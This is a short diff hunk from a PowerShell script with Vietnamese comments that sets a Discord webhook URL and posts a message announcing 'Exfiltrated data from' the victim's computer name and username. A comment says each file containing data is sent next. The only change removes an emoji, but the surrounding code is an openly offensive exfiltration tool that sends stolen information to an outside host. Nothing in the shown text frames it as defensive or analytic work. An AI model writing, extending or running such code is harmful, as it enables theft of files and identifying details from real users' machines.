@@ -67,7 +67,7 @@ $hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSB
 # ============================================
 
 # Gửi thông báo đầu tiên
-$body = @{ content = "**📁 Exfiltrated data from $env:COMPUTERNAME - $env:USERNAME**" } | ConvertTo-Json
+$body = @{ content = "**Exfiltrated data from $env:COMPUTERNAME - $env:USERNAME**" } | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
 
 # Gửi từng file có dữ liệu
